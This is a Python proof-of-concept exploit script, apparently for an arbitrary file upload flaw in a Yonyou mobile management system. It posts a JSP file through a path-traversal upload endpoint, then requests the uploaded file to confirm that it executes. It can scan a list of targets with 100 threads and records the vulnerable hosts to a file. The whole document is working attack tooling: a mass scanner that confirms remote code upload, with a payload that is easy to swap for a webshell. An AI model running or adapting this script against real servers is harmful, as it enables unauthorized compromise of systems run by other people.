#用友移动管理系统存在upload任意文件上传漏洞
import argparse,requests,sys,time,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m' #输出颜色
RESET = '\033[0m'

def banner():
    text = '''

 
███████╗██╗██╗     ███████╗    ██╗   ██╗██████╗ ██╗      █████╗  ██████╗ ██████╗ 
██╔════╝██║██║     ██╔════╝    ██║   ██║██╔══██╗██║     ██╔══██╗██╔═══██╗██╔══██╗
█████╗  ██║██║     █████╗      ██║   ██║██████╔╝██║     ███████║██║   ██║██║  ██║
██╔══╝  ██║██║     ██╔══╝      ██║   ██║██╔═══╝ ██║     ██╔══██║██║   ██║██║  ██║
██║     ██║███████╗███████╗    ╚██████╔╝██║     ███████╗██║  ██║╚██████╔╝██████╔╝
╚═╝     ╚═╝╚══════╝╚══════╝     ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝                                                ░                                ░        
                                                                version:Yongyou_YDGLXT_FileUpload 1.0
                                                                Author: Laow🚦
'''
    print(text)
def main():
    banner()
    #设置参数
    parser = argparse.ArgumentParser(description="用友移动管理系统存在upload任意文件上传漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help="input your url")
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()
    #处理资产，添加线程
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open('url.txt','r',encoding='utf-8')as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    url_payload = '/mobsm/common/upload?category=../webapps/nc_web/maupload/apk'
    url = target + url_payload
    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)", 
        "Content-Type": "multipart/form-data; boundary=f0172fd9dce75a2e80782ea59104aa75572bb578836be10bb15b5334876a", 
        "Accept-Encoding": "gzip, deflate, br", 
        "Connection": "close"
        }
    data = "--f0172fd9dce75a2e80782ea59104aa75572bb578836be10bb15b5334876a\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n<% out.println(\"test\");%>\r\n--f0172fd9dce75a2e80782ea59104aa75572bb578836be10bb15b5334876a--\r\n\r\n"
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    
    try:
        response = requests.post(url=url,headers=headers,data=data,timeout=5,verify=False)
        matches = re.search(r'/([^/]+)\.jsp"', response.text)
        url2 = target + '/maupload/apk/visitor/' + matches.group(1) + '.jsp'
        print(url2)
        response2 = requests.get(url=url2,proxies=proxies)
        if response.status_code == 200 and "test.jsp" in response.text and 'test' in response2.text:
            print( f"{GREEN}[+] {target} 存在文件上传漏洞！\n[+]请访问：{url2} {RESET}")
            with open('result.txt','a',encoding='utf-8')as f:
                f.write(target + '\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
    except Exception:
        pass


        
if __name__ == '__main__':
    main()
